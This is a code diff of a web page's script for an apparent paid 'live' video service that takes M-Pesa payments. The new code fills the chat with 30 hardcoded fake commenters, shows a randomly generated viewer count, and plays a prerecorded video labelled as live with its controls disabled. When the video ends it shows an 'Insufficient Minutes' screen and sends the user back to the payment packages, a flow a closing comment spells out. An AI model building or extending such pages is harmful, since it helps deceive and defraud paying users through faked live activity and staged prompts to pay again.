-  );
-
-  setTimeout(() => {
-
-    insufficientPage.classList.add(
-      "hidden"
-    );
-
-    packagesPage.classList.remove(
-      "hidden"
-    );
-
-    getAccessBtn.disabled = false;
-
-  },2000);
-
-}
-
-
-/* ================================
-   GET ACCESS BUTTON
-================================ */
-
-getAccessBtn.addEventListener(
-  "click",
-  payWithMpesa
-);
-
-
-/* ================================
-   COMMENTS
-================================ */
-
-const comments =
-  document.getElementById(
-    "comments"
-  );
-
-const commentInput =
-  document.getElementById(
-    "commentInput"
-  );
-
-const sendComment =
-  document.getElementById(
-    "sendComment"
-  );
-
-
-function addComment(
-  name,
-  message
-){
-
-  const div =
-    document.createElement("div");
-
-  div.className =
-    "comment";
-
-  const nameElement =
-    document.createElement("b");
-
-  nameElement.textContent =
-    name + ":";
-
-  div.appendChild(
-    nameElement
-  );
-
-  div.appendChild(
-    document.createTextNode(
-      " " + message
-    )
-  );
-
-  comments.appendChild(div);
-
-  comments.scrollTop =
-    comments.scrollHeight;
-}
-
-
-sendComment.addEventListener(
-  "click",
-  () => {
-
-    const message =
-      commentInput.value.trim();
-
-    if(!message){
-      return;
+        paymentCheckTimer = null;
     }
 
-    addComment(
-      "You",
-      message
-    );
+    loadingTitle.textContent =
+        "No payment is done";
 
-    commentInput.value = "";
+    loadingText.textContent =
+        "Returning to packages...";
 
-  }
+    setTimeout(() => {
+
+        showPackages();
+
+        getAccessButton.disabled =
+            false;
+
+    },2000);
+
+}
+
+
+/* BUTTON */
+
+getAccessButton.addEventListener(
+    "click",
+    payWithMpesa
 );
 
 
-commentInput.addEventListener(
-  "keydown",
-  event => {
+/* LIVE COMMENTS */
 
-    if(event.key === "Enter"){
+const liveComments = [
 
-      event.preventDefault();
+    ["Sarah","Wow 😍"],
 
-      sendComment.click();
+    ["Mercy","She is live now ❤️"],
+
+    ["Brenda","Hello beautiful 👋"],
+
+    ["Ann","I just joined"],
+
+    ["Lilian","Wow this is nice 🔥"],
+
+    ["Grace","Hi everyone ❤️"],
+
+    ["Diana","Can you see my message?"],
+
+    ["Faith","Amazing 😍"],
+
+    ["Cynthia","Hello from Kenya 🇰🇪"],
+
+    ["Lucy","This is live 🔥"],
+
+    ["Janet","Wowww ❤️"],
+
+    ["Sharon","I am watching"],
+
+    ["Carol","Beautiful 😍"],
+
+    ["Esther","Hello 👋"],
+
+    ["Ruth","Just joined"],
+
+    ["Vicky","Nice live"],
+
+    ["Joy","❤️❤️❤️"],
+
+    ["Mary","Wow"],
+
+    ["Angela","Hello everyone"],
+
+    ["Nancy","This is amazing 🔥"],
+
+    ["Becky","I can see you"],
+
+    ["Jackie","Hi ❤️"],
+
+    ["Susan","So nice"],
+
+    ["Emily","Watching now"],
+
+    ["Winnie","😍😍😍"],
+
+    ["Patricia","Hello"],
+
+    ["Rose","Nice video"],
+
+    ["Irene","Wow 🔥"],
+
+    ["Monica","I just came in"],
+
+    ["Alice","Beautiful ❤️"]
+
+];
+
+
+let commentTimer = null;
+
+let commentIndex = 0;
+
+
+/* ADD COMMENT */
+
+function addLiveComment(){
+
+    const item =
+        liveComments[
+            commentIndex %
+            liveComments.length
+        ];
+
+    commentIndex++;
+
+    const comment =
+        document.createElement("div");
+
+    comment.className =
+        "comment";
+
+    comment.innerHTML = `
+
+        <div class="comment-avatar">
+            ${item[0].charAt(0)}
+        </div>
+
+        <div class="comment-content">
+
+            <div class="comment-name">
+                ${item[0]}
+            </div>
+
+            <div class="comment-text">
+                ${item[1]}
+            </div>
+
+        </div>
+
+    `;
+
+    commentsBox.appendChild(comment);
+
+    commentsBox.scrollTop =
+        commentsBox.scrollHeight;
+
+    while(
+        commentsBox.children.length > 40
+    ){
+
+        commentsBox.removeChild(
+            commentsBox.firstElementChild
+        );
 
     }
 
-  }
+}
+
+
+/* START COMMENTS */
+
+function startLiveComments(){
+
+    stopLiveComments();
+
+    commentsBox.innerHTML = "";
+
+    commentIndex = 0;
+
+    for(
+        let i = 0;
+        i < 7;
+        i++
+    ){
+
+        addLiveComment();
+
+    }
+
+    commentTimer =
+        setInterval(
+            addLiveComment,
+            900
+        );
+
+}
+
+
+/* STOP COMMENTS */
+
+function stopLiveComments(){
+
+    if(commentTimer){
+
+        clearInterval(
+            commentTimer
+        );
+
+        commentTimer = null;
+    }
+
+}
+
+
+/* VIEWERS */
+
+let viewerTimer = null;
+
+function startViewerCount(){
+
+    stopViewerCount();
+
+    function update(){
+
+        viewerNumber.textContent =
+            Math.floor(
+                Math.random() * 16
+            ) + 15;
+
+    }
+
+    update();
+
+    viewerTimer =
+        setInterval(
+            update,
+            2500
+        );
+
+}
+
+
+function stopViewerCount(){
+
+    if(viewerTimer){
+
+        clearInterval(
+            viewerTimer
+        );
+
+        viewerTimer = null;
+    }
+
+}
+
+
+/* START LIVE VIDEO */
+
+function startLiveVideo(){
+
+    stopLiveComments();
+
+    stopViewerCount();
+
+    commentsBox.innerHTML = "";
+
+    packagesPage.style.display =
+        "none";
+
+    loadingPage.style.display =
+        "none";
+
+    insufficientPage.style.display =
+        "none";
+
+    livePage.style.display =
+        "block";
+
+    liveVideo.currentTime = 0;
+
+    startLiveComments();
+
+    startViewerCount();
+
+    liveVideo.play()
+    .catch(error => {
+
+        console.warn(
+            "Video play:",
+            error
+        );
+
+    });
+
+}
+
+
+/* VIDEO ENDS */
+
+liveVideo.addEventListener(
+    "ended",
+    () => {
+
+        stopLiveComments();
+
+        stopViewerCount();
+
+        liveVideo.pause();
+
+        livePage.style.display =
+            "none";
+
+        insufficientPage.style.display =
+            "flex";
+
+        let seconds = 2;
+
+        const timer =
+            document.getElementById(
+                "insufficientTimer"
+            );
+
+        timer.textContent =
+            "Returning to packages in 2...";
+
+        const countdown =
+            setInterval(() => {
+
+                seconds--;
+
+                if(seconds > 0){
+
+                    timer.textContent =
+                        "Returning to packages in " +
+                        seconds +
+                        "...";
+
+                }else{
+
+                    clearInterval(
+                        countdown
+                    );
+
+                    insufficientPage.style.display =
+                        "none";
+
+                    packagesPage.style.display =
+                        "block";
+
+                    getAccessButton.disabled =
+                        false;
+
+                    phoneNumber.value = "";
+
+                    liveVideo.currentTime = 0;
+
+                    commentsBox.innerHTML = "";
+
+                }
+
+            },1000);
+
+    }
+);
+  <script>
+
+/* FINAL CLEANUP */
+
+window.addEventListener(
+    "beforeunload",
+    () => {
+
+        if (paymentCheckTimer) {
+            clearTimeout(paymentCheckTimer);
+        }
+
+        stopLiveComments();
+        stopViewerCount();
+
+    }
 );
 
 
-/* SAMPLE COMMENTS */
+/* PREVENT VIDEO CONTROLS */
 
-[
-  ["Aisha","Hello ❤️"],
-  ["Mary","Is anyone online?"],
-  ["Lucy","Hi there"],
-  ["Jane","Hello everyone"],
-  ["Grace","😍😍"],
-  ["Sarah","Anyone available?"],
-  ["Diana","Hi ❤️"]
-].forEach(item => {
-
-  addComment(
-    item[0],
-    item[1]
-  );
-
-});
+liveVideo.controls = false;
 
 
-/* ================================
-   PAGE INITIAL STATE
-================================ */
+/* MAKE SURE PACKAGES START VISIBLE */
 
-packagesPage.classList.remove(
-  "hidden"
-);
+packagesPage.style.display = "block";
 
-loadingPage.classList.add(
-  "hidden"
-);
+loadingPage.style.display = "none";
 
-livePage.classList.add(
-  "hidden"
-);
+livePage.style.display = "none";
 
-insufficientPage.classList.add(
-  "hidden"
-);
+insufficientPage.style.display = "none";
+
+
+/*
+   IMPORTANT FLOW:
+
+   Payment confirmed
+        ↓
+   20-second LIVE video
+        ↓
+   Video ends
+        ↓
+   Insufficient Minutes
+        ↓
+   2 seconds
+        ↓
+   Packages
+*/
 
 </script>
 
